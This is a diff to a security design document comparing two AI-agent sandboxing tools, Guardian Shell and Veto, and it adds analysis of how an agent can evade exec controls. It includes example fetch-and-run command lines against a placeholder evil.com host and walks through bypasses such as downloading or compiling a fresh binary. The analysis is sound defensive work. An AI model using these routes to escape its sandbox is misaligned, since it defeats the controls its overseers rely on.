@@ -462,14 +462,16 @@ Policy:
 
 Agent runs: /tmp/helper
   → Exec event captured, filename is "/tmp/helper"
-  → Does NOT match "wget" in deny list
-  → But exec monitoring is log-only in Guardian Shell
-  → Even if it matched, it would only be logged, not blocked
+  → evaluate_exec_policy(): "/tmp/helper" does NOT match "wget" in deny list
+  → If default = "deny": BLOCKED ✅ (path not in allow list)
+  → If default = "allow": ALLOWED ❌ (path not in deny list — bypass works)
 ```
 
-**Verdict:** Guardian Shell's exec monitoring is **log-only** — it does not
-block execution. The copy/rename doesn't even need to be tried because exec
-isn't enforced. (Known Limitation #6: "Exec monitoring is log-only.")
+**Verdict:** Guardian Shell **blocks** this with `default = "deny"` exec
+policy (unknown paths are denied). But with `default = "allow"`, the
+copy/rename bypasses the deny list because the path changed. This is a
+fundamental weakness of path-based identification — the binary's identity
+is tied to its location, not its content.
 
 **Against Veto:**
 
@@ -594,12 +596,219 @@ mechanism to request changes).
 |-----------------|---------------|------|
 | `/proc/self/root/` path trick | Vulnerable (mitigated by default-deny) | Immune (hash-based) |
 | Symlink to blocked resource | Vulnerable (raw path captured) | Immune (symlinks resolved) |
-| Copy/rename binary | N/A (exec not enforced) | Immune (same hash) |
+| Copy/rename binary | Vulnerable (different path) | Immune (same hash) |
 | Dynamic linker invocation | Partial protection (file deny list) | Vulnerable (no execve) |
 | Approval fatigue | Mitigated (dashboard + timeout) | Immune (no interactive approval) |
 | Binary modification (recompile) | N/A | Vulnerable (new hash) |
+| Download fresh binary | Blocked (multi-layer, see Bypass 6) | Vulnerable in denylist mode |
 | Interpreted scripts (python, sh) | Monitored (file access) | Weak (interpreter allowed) |
 | Network exfiltration | Not monitored | Not monitored |
+
+---
+
+### Bypass 6: Download Fresh Binary (Compile/Fetch New Copy)
+
+**The attack:** Instead of using a blocked binary on the system, the agent
+downloads a fresh copy from the internet — a different build, different
+version, different bytes, different hash.
+
+```bash
+# wget is blocked. Agent uses an allowed interpreter to download a fresh copy:
+python3 -c "
+import urllib.request
+urllib.request.urlretrieve(
+    'https://github.com/wget/wget/releases/download/v1.25/wget-1.25.tar.gz',
+    '/tmp/wget_fresh'
+)
+"
+chmod +x /tmp/wget_fresh
+/tmp/wget_fresh http://evil.com/payload
+```
+
+Or even simpler — compile from source:
+
+```bash
+# Agent downloads source code and builds a new binary
+python3 -c "
+import urllib.request
+urllib.request.urlretrieve('https://evil.com/tool.c', '/tmp/tool.c')
+"
+gcc /tmp/tool.c -o /tmp/tool
+/tmp/tool    # Brand new binary, never-before-seen hash
+```
+
+**Against Veto (denylist mode):**
+
+```
+Policy mode: DENYLIST
+  DENY sha256:a1b2c3d4...    (system wget's hash)
+
+Agent runs: /tmp/wget_fresh
+  → Veto computes hash → sha256:COMPLETELY_DIFFERENT_HASH
+  → Different build, different compiler flags, different version
+  → Hash NOT in deny list
+  → ALLOWED — BYPASS SUCCESSFUL ❌
+
+The downloaded binary is functionally identical to wget (same features,
+same network capabilities) but has completely different bytes.
+Veto's deny list only knows the hash of the SYSTEM copy.
+```
+
+**Against Veto (allowlist mode):**
+
+```
+Policy mode: ALLOWLIST
+  ALLOW sha256:1111... (cat)
+  ALLOW sha256:2222... (ls)
+  ALLOW sha256:3333... (grep)
+
+Agent runs: /tmp/wget_fresh
+  → Veto computes hash → sha256:UNKNOWN
+  → Hash NOT in allowlist
+  → BLOCKED ✅
+
+Allowlist mode catches this because ONLY pre-approved binaries can run.
+But this requires maintaining hashes for EVERY legitimate binary the
+agent might need — and every hash changes on every apt upgrade.
+```
+
+**Against Guardian Shell:**
+
+Guardian Shell blocks this attack at **multiple layers**, not just at execution:
+
+```
+Attack chain:
+  1. Download the binary     → requires network access
+  2. Save to disk            → requires file write access
+  3. chmod +x                → requires file permission change
+  4. Execute                 → requires exec permission
+
+Guardian Shell enforcement at each step:
+
+Step 1 — Network (Phase 7b, planned):
+  → Outbound connection monitoring via sys_enter_connect tracepoint
+  → Port-based policy can block connections to unknown hosts
+
+Step 2 — File write:
+  [agents.file_access]
+  default = "deny"
+  allow = ["/home/user/project/**"]
+
+  Agent (python3) tries to write /tmp/wget_fresh:
+    → openat("/tmp/wget_fresh", O_WRONLY)
+    → Path "/tmp/wget_fresh" — if /tmp is not in allow list → BLOCKED ✅
+    → Binary never saved to disk. Attack stops here.
+
+Step 3 — Even if write succeeded (e.g., /tmp is allowed):
+  Agent tries chmod +x /tmp/wget_fresh:
+    → Currently not hooked (limitation), but the binary exists on disk
+
+Step 4 — Exec enforcement:
+  [agents.exec]
+  default = "deny"
+  allow = ["/usr/bin/ls", "/usr/bin/cat"]
+
+  Agent runs: /tmp/wget_fresh
+    → Tracepoint captures path "/tmp/wget_fresh"
+    → evaluate_exec_policy(): not in allow list
+    → default = "deny"
+    → PENDING_EXEC_DENY set → LSM blocks with -EPERM ✅
+    → Binary never executes
+```
+
+**Verdict:** Veto in **denylist mode** is completely bypassed — the fresh
+binary has an unknown hash. Veto in **allowlist mode** catches it, but at the
+cost of massive hash maintenance. Guardian Shell with `default = "deny"` on
+both file access and exec blocks the attack at multiple independent layers —
+even if one layer fails, the others catch it.
+
+**Key insight:** This bypass reveals a fundamental weakness of hash-based
+denylists. You can only deny hashes you **already know about**. A freshly
+downloaded or compiled binary has a hash nobody has ever seen. Path-based
+allowlists with `default = "deny"` are stronger here because they don't care
+about the binary's content — if the path isn't explicitly allowed, it's
+blocked regardless.
+
+---
+
+### Bypass 7: Binary Update / Package Upgrade
+
+**The attack:** Not malicious — this is a **legitimate operation** that breaks
+Veto's policy. When a binary is updated via a package manager, its hash
+changes.
+
+```bash
+# Day 1: Admin adds wget to allowlist
+$ sha256sum /usr/bin/wget
+a1b2c3d4e5f6...  /usr/bin/wget
+# Policy: ALLOW sha256:a1b2c3d4e5f6...
+
+# Day 2: Security patch released
+$ sudo apt upgrade wget
+# wget binary updated with security fix
+
+$ sha256sum /usr/bin/wget
+f7e8d9c0b1a2...  /usr/bin/wget    # COMPLETELY DIFFERENT HASH
+
+# Agent tries to use wget (legitimately):
+$ wget https://api.example.com/data
+# → Veto: hash f7e8d9c0b1a2... NOT in allowlist → BLOCKED ❌
+# Legitimate use broken by a routine security update
+```
+
+**Scale of the problem:**
+
+```bash
+# How many binaries on a typical Ubuntu system?
+$ find /usr/bin /usr/sbin /bin /sbin -type f -executable | wc -l
+~2500 binaries
+
+# How many packages updated in a typical month?
+$ grep "upgrade" /var/log/dpkg.log | wc -l
+~100-300 package upgrades
+
+# Each package can contain 1-20 binaries
+# That's potentially HUNDREDS of hash changes per month
+# Each one requires:
+#   1. Compute new hash
+#   2. Remove old hash from policy
+#   3. Add new hash to policy
+#   4. Reload Veto
+# Miss even ONE → that binary breaks for all users
+```
+
+**Against Veto:**
+
+| Policy Mode | Impact |
+|------------|--------|
+| **Allowlist** | Every update breaks allowed binaries until hashes are refreshed. Production risk. |
+| **Denylist** | Updated blocked binaries get new hashes, falling off the deny list. Security gap. |
+
+Both modes suffer. Allowlist breaks legitimate use. Denylist loses enforcement.
+
+**Against Guardian Shell:**
+
+```toml
+# Guardian Shell policy — survives ALL updates automatically
+[agents.exec]
+default = "deny"
+allow = ["/usr/bin/wget"]
+```
+
+```
+Before apt upgrade:
+  /usr/bin/wget (old version) → path matches allow → ALLOWED ✅
+
+After apt upgrade:
+  /usr/bin/wget (new version) → path STILL matches allow → ALLOWED ✅
+  No policy change needed. Zero maintenance.
+```
+
+**Verdict:** This is not a security bypass — it is an **operational burden**
+that makes hash-based policies expensive to maintain. Path-based policies are
+immune to this problem entirely. In environments with frequent updates (most
+production servers), this maintenance cost is Veto's most significant
+practical disadvantage.
 
 ---
 
@@ -689,7 +898,7 @@ ability to handle legitimate edge cases at runtime.
 |--------------|-----------|----------|-------|
 | File reads (openat) | Yes | Yes | LSM `file_open` hook blocks unauthorized opens |
 | File writes (openat with O_WRONLY/O_RDWR) | Yes | Yes | Same mechanism, flags captured |
-| Command execution (execve) | Yes | **No** | Log-only monitoring (Known Limitation #6) |
+| Command execution (execve) | Yes | **Yes** | LSM `bprm_check_security` blocks unauthorized exec (Phase 7) |
 | Child processes | Yes | Yes | Cgroup inheritance or fork tracking |
 | Network access | No | No | Not currently hooked |
 | IPC / signals | No | No | Not currently hooked |
@@ -724,7 +933,7 @@ complementary, not competing.
 | **Policy granularity** | Per-agent, per-path, with wildcards | Per-binary (system-wide) |
 | **Dynamic policy** | Yes (BPF map updates, temporary grants) | Static (requires policy reload) |
 | **Path resolution** | No (raw syscall path) | Yes (symlinks/mounts resolved before hash) |
-| **Exec enforcement** | Log-only monitoring | Full pre-execution blocking |
+| **Exec enforcement** | Full pre-execution blocking (path-based, LSM `bprm_check_security`) | Full pre-execution blocking (hash-based, LSM `bprm_check_security`) |
 | **File access enforcement** | Full (LSM `file_open` returns -EACCES) | None (not in scope) |
 | **Interactive approval** | Yes (permission requests + dashboard) | No |
 | **Real-time monitoring** | Yes (SSE dashboard, alerting, Prometheus) | Minimal |
@@ -733,7 +942,7 @@ complementary, not competing.
 | **Resource limits** | Yes (cgroup v2: memory, PIDs, CPU) | No |
 | **Child process tracking** | Yes (cgroup inheritance + fork tracking) | Per-binary (each exec checked) |
 | **Immune to path tricks** | No (raw path from syscall) | Yes (content hash, not path) |
-| **Immune to copy/rename** | N/A (file policy, not exec policy) | Yes (same content = same hash) |
+| **Immune to copy/rename** | No (different path = different identity) | Yes (same content = same hash) |
 | **Immune to dynamic linker** | Partial (if binary path in file deny) | No (mmap bypasses execve hook) |
 | **Auto-deny timeout** | Yes (120 seconds) | N/A |
 | **Audit trail** | Yes (last 100 resolved requests in memory) | Not documented |
@@ -811,19 +1020,30 @@ downloading a binary from the internet.
 Agent runs: wget http://evil.com/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload
 ```
 
-**Guardian Shell response:**
+**Guardian Shell response (Phase 7 — exec enforcement implemented):**
 
 ```
-1. execve("wget", ...) → Exec event logged (but not blocked)
-2. wget opens network connection → Not monitored
+1. execve("wget", ...) → Tracepoint captures filename
+   → evaluate_exec_policy() checks deny/allow lists
+   → If "/usr/bin/wget" is in exec deny list or not in allow list:
+     PENDING_EXEC_DENY set → LSM blocks with -EPERM
+   → wget never runs, payload never downloaded → BLOCKED ✅
+
+   If wget is somehow allowed:
+2. wget opens network connection → Logged (network monitoring Phase 7b)
 3. wget writes to /tmp/payload via openat
-   → If "/tmp/**" is in allow list: write succeeds
-4. execve("/tmp/payload") → Exec event logged (but not blocked)
-5. /tmp/payload runs with full agent permissions within its cgroup
+   → If "/tmp/**" is in file allow list: write succeeds
+   → If not: BLOCKED at file write level ✅
+4. chmod +x /tmp/payload
+5. execve("/tmp/payload")
+   → evaluate_exec_policy(): "/tmp/payload" not in exec allow list
+   → default = "deny" → PENDING_EXEC_DENY set → LSM blocks → BLOCKED ✅
 ```
 
-**Result:** Guardian Shell **logs** the execution but **cannot block** it.
-File access to `/tmp` is likely allowed. Exec enforcement is not implemented.
+**Result:** With `default = "deny"` on exec policy, Guardian Shell **blocks**
+both the initial wget execution and the downloaded payload execution. Even if
+the download somehow succeeds, the payload cannot execute. Multi-layer
+enforcement catches the attack at multiple points.
 
 **Veto response:**
 
@@ -842,10 +1062,15 @@ File access to `/tmp` is likely allowed. Exec enforcement is not implemented.
 ```
 
 **Result:** In **allowlist mode**, Veto blocks all unknown binaries — very
-strong protection. In denylist mode, novel payloads slip through.
+strong protection. In **denylist mode**, novel payloads slip through (the
+downloaded payload has an unknown hash, not in the deny list).
 
-**Verdict:** Veto is stronger here. Its allowlist mode blocks unknown binaries
-by default. Guardian Shell lacks exec enforcement entirely.
+**Verdict:** Both tools can block this attack when properly configured.
+Guardian Shell with `default = "deny"` exec policy blocks unknown binaries
+by path. Veto in allowlist mode blocks unknown binaries by hash. Veto in
+**denylist mode** is vulnerable — the downloaded payload has a never-before-seen
+hash. Guardian Shell's multi-layer approach (file write control + exec control)
+provides defense in depth that Veto's single exec checkpoint cannot match.
 
 ---
 
@@ -869,7 +1094,7 @@ python3 /tmp/exfil.py
 **Guardian Shell response:**
 
 ```
-1. execve("python3") → Exec event logged (not blocked)
+1. execve("python3") → Exec policy checked (python3 likely in allow list)
 2. python3 opens /tmp/exfil.py (openat) → /tmp/** allowed → reads script
 3. python3 opens /etc/passwd (openat)
    → If "/etc/passwd" is in deny list: BLOCKED
@@ -959,8 +1184,8 @@ side effect of monitoring all `openat` calls.
 - **Path-based file matching** is vulnerable to symlinks, `/proc/self/root/`,
   hard links, and other path manipulation techniques
 - **No path canonicalization**: raw syscall paths matched against policy
-- **Exec monitoring is log-only**: cannot block binary execution
-- **Only hooks `openat`**: doesn't cover `openat2`, `open`, `readlinkat`
+- **Exec enforcement is path-based**: blocks by path, not content — vulnerable to copy/rename
+- **Hooks `openat`, `openat2`, `open`**: covers main file open syscalls but not `readlinkat`
 - **Network not monitored**: data exfiltration via network is invisible
 - **Approval fatigue**: interactive requests can be social-engineered
 - **In-memory state**: permission audit trail lost on restart
@@ -982,9 +1207,12 @@ side effect of monitoring all `openat` calls.
 - **No per-agent policy**: system-wide binary allow/deny, not per-process
 - **No interactive approval**: cannot handle legitimate runtime edge cases
 - **Blind to interpreted code**: Python, Bash, Node.js scripts are invisible
-- **Hash maintenance burden**: every binary update requires policy update
+- **Hash maintenance burden**: every `apt upgrade` / binary update changes hashes, breaking allowlist policies and invalidating denylist entries. On a typical system with ~2500 binaries and ~100-300 monthly package updates, this requires constant policy maintenance. (See Bypass 7 for details.)
+- **Fresh binary download bypass**: Agent can download or compile a functionally identical binary with a different hash, completely bypassing denylist mode. Only allowlist mode catches this, at the cost of even higher maintenance burden. (See Bypass 6 for details.)
 - **No observability stack**: no dashboard, alerting, or monitoring reported
 - **Recompile bypass**: modifying one byte of a binary changes its hash
+- **Single enforcement point**: Veto only checks at `execve()` — if the binary reaches execution through any other mechanism (mmap, dlopen, interpreter), Veto is blind. Guardian Shell's multi-layer approach (file write + exec + network) provides multiple independent enforcement points, so even if one layer is bypassed, others catch the attack.
+- **No policy for data files**: Veto controls which binaries run, not which data they access. A legitimate binary (e.g., `cat`, `python3`) can read any file on the system — Veto has no mechanism to restrict data access.
 
 ---
 
@@ -1030,11 +1258,13 @@ effective when used **together** in a layered security architecture:
 
 | Attack | Veto | Guardian Shell | Combined |
 |--------|------|----------------|----------|
-| Run unknown binary | BLOCKED | Logged only | BLOCKED |
+| Run unknown binary | BLOCKED | Blocked (default-deny exec) | BLOCKED |
 | Read sensitive file | Not covered | BLOCKED | BLOCKED |
 | Path trick on file | Not covered | Partially blocked | Partially blocked |
 | Path trick on binary | BLOCKED (hash) | N/A | BLOCKED |
 | Dynamic linker bypass | BYPASSED | Blocked if in file deny | BLOCKED |
+| Download fresh binary | Denylist: BYPASSED / Allowlist: BLOCKED | Blocked (multi-layer) | BLOCKED |
+| Binary update breaks policy | Policy breaks (hash changed) | No impact (path unchanged) | Policy breaks (Veto side) |
 | Interpreted script attack | Not covered | File reads blocked | File reads blocked |
 | Network exfiltration | Not covered | Not covered | Not covered* |
 | Social engineering (approval) | No surface | Possible | Mitigated |
@@ -1077,6 +1307,25 @@ effective when used **together** in a layered security architecture:
    (file access + agent identity) + SELinux/AppArmor (system MAC) provides
    the strongest posture.
 
+8. **Hash-based denylists have a fundamental gap.** You can only deny hashes
+   you already know about. An agent that downloads, compiles, or fetches a
+   fresh binary gets a never-before-seen hash that no denylist contains.
+   Path-based `default = "deny"` is actually stronger against novel binaries
+   because it doesn't care about content — unknown paths are blocked regardless.
+
+9. **Hash maintenance is Veto's hidden cost.** Every package update changes
+   binary hashes, breaking allowlist policies and invalidating denylist entries.
+   On a system with thousands of binaries and monthly security patches, this
+   is a significant operational burden. Path-based policies survive binary
+   updates with zero maintenance.
+
+10. **Multi-layer enforcement beats single-point enforcement.** Veto checks
+    only at `execve()` — one point of enforcement. Guardian Shell checks at
+    file write (can the agent save the binary?), file read (can the linker
+    open it?), exec (can the agent run it?), and eventually network (can the
+    agent download it?). Even if one layer is bypassed, others provide
+    independent enforcement.
+
 ---
 
 ## Potential Guardian Shell Improvements (Informed by Veto's Approach)
@@ -1086,7 +1335,7 @@ Based on this comparison, Guardian Shell could be hardened with:
 | Improvement | Difficulty | Impact |
 |------------|------------|--------|
 | **Path canonicalization** (`realpath` before matching) | Medium | Closes symlink and `/proc/self/root` bypasses |
-| **Exec enforcement** (block, not just log) | Medium | Blocks binary execution like Veto |
+| **Exec enforcement** | ~~Done (Phase 7)~~ | ~~Blocks binary execution via LSM `bprm_check_security`~~ |
 | **Content hash for exec** (hash binary before exec allow) | High | Veto-like identity for binaries |
 | **Network syscall monitoring** (`connect`, `sendto`) | Medium | Detect/block data exfiltration |
 | **`openat2` and `open` hooks** | Low | Close syscall coverage gaps |
